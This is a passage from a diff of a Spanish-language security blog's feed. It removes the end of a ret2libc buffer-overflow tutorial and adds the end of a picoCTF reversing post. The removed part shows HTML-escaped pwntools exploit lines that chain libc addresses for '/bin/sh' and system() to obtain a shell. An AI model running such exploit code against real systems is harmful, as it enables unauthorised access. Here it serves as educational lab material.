-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bin_sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Se pueden dar cuenta que se esta sumando la direccion de libc con los offsets de pop rdi, bin/sh, system, y ret, esto es para que nos saque la direccion real, tambien usamos “p64” para transformar esas direcciones a little endian de 64 bits, ahora ejecutamos y vemos como obtuvimos una shell&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/ret2libc/pwn.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/ret2libc/waifu.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="Explotacion binaria" /><category term="ret2libc" /><category term="gdb" /><category term="bof" /><summary type="html">En este articulo veremos como realizar un ataque con una tecnica llamada ret2libc para hacer bypass del NX</summary></entry></feed>
+&lt;font size=&quot;1&quot;&gt; ijaesuperramadre Kamiya esta bien guapa&lt;/font&gt;</content><author><name>c4rta</name></author><category term="Reversing" /><category term="radare2" /><summary type="html">Resolveremos un pequeño ejercicio de reversing de picoCTF</summary></entry></feed>
